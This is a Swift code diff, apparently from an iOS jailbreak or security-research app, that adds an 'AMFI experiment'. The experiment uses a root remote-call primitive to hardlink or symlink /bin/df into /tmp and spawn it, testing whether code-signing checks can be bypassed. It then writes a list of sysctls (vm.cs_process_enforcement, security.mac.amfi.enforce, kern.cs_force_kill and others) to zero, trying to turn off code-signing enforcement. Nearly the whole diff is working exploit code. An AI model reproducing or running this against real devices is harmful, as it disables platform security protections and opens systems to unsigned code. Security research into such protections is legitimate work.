@@ -2718,6 +2718,75 @@ struct AMFIExperimentView: View {
         RootExecutor.rcall(rc, "free", srcPath)
         RootExecutor.rcall(rc, "free", dstPath)
         
+        // Test 2: Try HARDLINK instead of copy (preserves signature!)
+        detail += "\nTest 2: hardlink (preserves code signature)...\n"
+        let linkSrc = remote_alloc_str(rc, "/bin/df")
+        let linkDst = remote_alloc_str(rc, "/tmp/.dsp_hardlink_test")
+        RootExecutor.rcall(rc, "unlink", linkDst)
+        let linkRet = RootExecutor.rcall(rc, "link", linkSrc, linkDst)
+        detail += "link(/bin/df, /tmp/...): ret=\(linkRet)\n"
+        
+        if linkRet == 0 {
+            // Hardlink created! Try spawn
+            let argvBase2 = mem + 0x1C00
+            rc[argvBase2].setValue64(linkDst)
+            rc[argvBase2 + 8].setValue64(0)
+            let pidAddr2 = mem + 0x1E00
+            rc[pidAddr2].setValue64(0)
+            let spawnLink = RootExecutor.rcall(rc, "posix_spawn", pidAddr2, linkDst, 0, 0, argvBase2, 0)
+            RootExecutor.rcall(rc, "usleep", 500000)
+            let waitLink = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
+            detail += "spawn(hardlink): ret=\(spawnLink), wait=\(waitLink)\n"
+            if spawnLink == 0 {
+                detail += "🎉 HARDLINK SPAWN WORKS!\n"
+            }
+            RootExecutor.rcall(rc, "unlink", linkDst)
+        } else {
+            detail += "hardlink failed (cross-device? rootfs→tmp)\n"
+            // Try symlink instead
+            detail += "\nTest 3: symlink...\n"
+            let symlinkRet = RootExecutor.rcall(rc, "symlink", linkSrc, linkDst)
+            detail += "symlink(/bin/df, /tmp/...): ret=\(symlinkRet)\n"
+            if symlinkRet == 0 {
+                let argvBase3 = mem + 0x1C00
+                rc[argvBase3].setValue64(linkDst)
+                rc[argvBase3 + 8].setValue64(0)
+                let pidAddr3 = mem + 0x1E00
+                rc[pidAddr3].setValue64(0)
+                let spawnSym = RootExecutor.rcall(rc, "posix_spawn", pidAddr3, linkDst, 0, 0, argvBase3, 0)
+                RootExecutor.rcall(rc, "usleep", 500000)
+                let waitSym = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
+                detail += "spawn(symlink): ret=\(spawnSym), wait=\(waitSym)\n"
+                if spawnSym == 0 {
+                    detail += "🎉 SYMLINK SPAWN WORKS!\n"
+                }
+                RootExecutor.rcall(rc, "unlink", linkDst)
+            }
+        }
+        RootExecutor.rcall(rc, "free", linkSrc)
+        RootExecutor.rcall(rc, "free", linkDst)
+        
+        // Try more sysctls
+        detail += "\nExtra sysctl writes...\n"
+        let extraSysctls: [(String, UInt32)] = [
+            ("vm.cs_all_vnodes", 0),
+            ("vm.cs_process_enforcement", 0),
+            ("vm.cs_system_enforcement", 0),
+            ("security.mac.amfi.enforce", 0),
+            ("kern.cs_force_kill", 0),
+            ("kern.cs_force_hard", 0),
+        ]
+        for (name, val) in extraSysctls {
+            let nAddr = remote_alloc_str(rc, name)
+            let vAddr = mem + 0x1A00
+            rc[vAddr].setValue32(val)
+            let r = RootExecutor.rcall(rc, "sysctlbyname", nAddr, 0, 0, vAddr, 4)
+            if r == 0 {
+                detail += "✅ WROTE \(name) = \(val)\n"
+            }
+            RootExecutor.rcall(rc, "free", nAddr)
+        }
+        
         let hasSuccess = detail.contains("🎉") || detail.contains("✅ WROTE")
         return ExperimentResult(name: "sysctl CS variables", success: hasSuccess, detail: detail, timestamp: Date())
     }
